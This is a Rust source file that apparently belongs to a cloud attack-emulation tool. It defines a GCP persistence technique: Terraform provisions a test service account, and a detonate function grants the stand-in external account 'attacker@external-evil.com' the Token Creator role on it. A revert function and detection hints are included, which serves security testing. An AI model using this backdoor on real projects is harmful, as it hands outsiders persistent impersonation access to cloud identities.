use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    google = { source = "hashicorp/google", version = "~> 4.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

variable "project_id" {}

provider "google" { project = var.project_id }

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "google_service_account" "sa" {
  account_id   = "stratus-sa-${random_string.suffix.result}"
  display_name = "Stratus Red Team Service Account"
}

output "sa_email"   { value = google_service_account.sa.email }
output "project_id" { value = var.project_id }
"#;

const ATTACKER_ACCOUNT: &str = "user:attacker@external-evil.com";

async fn gcp_token() -> Result<String> {
    if let Ok(token) = std::env::var("GOOGLE_ACCESS_TOKEN") {
        return Ok(token);
    }
    let output = tokio::process::Command::new("gcloud")
        .args(["auth", "print-access-token"])
        .output()
        .await?;
    let token = String::from_utf8(output.stdout)?.trim().to_string();
    if token.is_empty() {
        anyhow::bail!("Could not obtain GCP access token via gcloud CLI");
    }
    Ok(token)
}

async fn gcp_project() -> Result<String> {
    std::env::var("GOOGLE_PROJECT_ID")
        .map_err(|_| anyhow::anyhow!("GOOGLE_PROJECT_ID not set"))
}

async fn detonate_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    let sa_email = outputs
        .get("sa_email")
        .ok_or_else(|| anyhow::anyhow!("Missing output: sa_email"))?;

    let url = format!(
        "https://iam.googleapis.com/v1/projects/{}/serviceAccounts/{}/setIamPolicy",
        project, sa_email
    );

    let body = serde_json::json!({
        "policy": {
            "bindings": [{
                "role": "roles/iam.serviceAccountTokenCreator",
                "members": [ATTACKER_ACCOUNT]
            }]
        }
    });

    let resp = http
        .post(&url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 200 {
        println!(
            "Set IAM policy on service account '{}' to allow '{}' to impersonate it — attacker can now create tokens as this SA",
            sa_email, ATTACKER_ACCOUNT
        );
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!(
            "Failed to set service account IAM policy ({}): {}",
            status,
            text
        );
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let token = gcp_token().await?;
    let project = gcp_project().await?;
    let http = reqwest::Client::new();

    let sa_email = outputs
        .get("sa_email")
        .ok_or_else(|| anyhow::anyhow!("Missing output: sa_email"))?;

    let url = format!(
        "https://iam.googleapis.com/v1/projects/{}/serviceAccounts/{}/setIamPolicy",
        project, sa_email
    );

    let body = serde_json::json!({
        "policy": {
            "bindings": []
        }
    });

    let resp = http
        .post(&url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await?;

    if resp.status().is_success() || resp.status().as_u16() == 200 {
        println!("Removed attacker IAM binding from service account '{}'", sa_email);
    } else {
        let status = resp.status();
        let text = resp.text().await.unwrap_or_default();
        anyhow::bail!(
            "Failed to remove service account IAM binding ({}): {}",
            status,
            text
        );
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "gcp.persistence.backdoor-service-account-policy",
        friendly_name: "Backdoor GCP Service Account IAM Policy",
        description: "Adds an external attacker account as a Service Account Token Creator on a GCP service account, allowing the attacker to impersonate the SA and generate access tokens.",
        detection: "GCP Audit Log: iam.serviceAccounts.setIamPolicy with external member. Cloud Security Command Center: Anomalous SA access grant.",
        platform: Platform::Gcp,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
